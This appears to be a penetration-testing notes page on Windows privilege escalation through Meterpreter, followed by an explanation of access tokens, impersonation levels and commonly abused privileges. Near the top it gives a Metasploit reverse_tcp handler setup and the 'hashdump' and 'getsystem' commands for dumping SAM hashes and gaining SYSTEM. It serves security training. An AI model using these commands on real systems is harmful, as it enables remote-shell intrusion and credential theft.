# Meterpreter Privesc

To make the privilege escalation easier, We can switch to a meterpreter shell for ease of access of commands and run/load extensions and post-exploitation tools.

Ensure Handler is setup:

```
use exploit/multi/handler 
set PAYLOAD windows/meterpreter/reverse_tcp 
set LHOST 10.10.10.10 
set LPORT 1234
run
```

Privilege Commands

```
Dumps the contents of the SAM database
hashdump
Attempt to elevate your privilege to that of local system.
getsystem    
```

### Token impersonation

Windows uses tokens to ensure that accounts have the right privileges to carry out particular actions. Account tokens are assigned to an account when users log in or are authenticated. This is usually done by LSASS.exe(think of this as an authentication process).

This access token consists of:

* user SIDs(security identifier)
* group SIDs
* privileges

{% embed url="https://docs.microsoft.com/en-us/windows/win32/secauthz/access-tokens" %}

There are two types of access tokens:

* primary access tokens: those associated with a user account that are generated on log on
* impersonation tokens: these allow a particular process(or thread in a process) to gain access to resources using the token of another (user/client) process

For an impersonation token, there are different levels:

* SecurityAnonymous: current user/client cannot impersonate another user/client
* SecurityIdentification: current user/client can get the identity and privileges of a client, but cannot impersonate the client
* SecurityImpersonation: current user/client can impersonate the client's security context on the local system
* SecurityDelegation: current user/client can impersonate the client's security context on a remote system

where the security context is a data structure that contains users' relevant security information.

The privileges of an account(which are either given to the account when created or inherited from a group) allow a user to carry out particular actions. Here are the most commonly abused privileges:

* SeImpersonatePrivilege
* SeAssignPrimaryPrivilege
* SeTcbPrivilege
* SeBackupPrivilege
* SeRestorePrivilege
* SeCreateTokenPrivilege
* SeLoadDriverPrivilege
* SeTakeOwnershipPrivilege
* SeDebugPrivilege



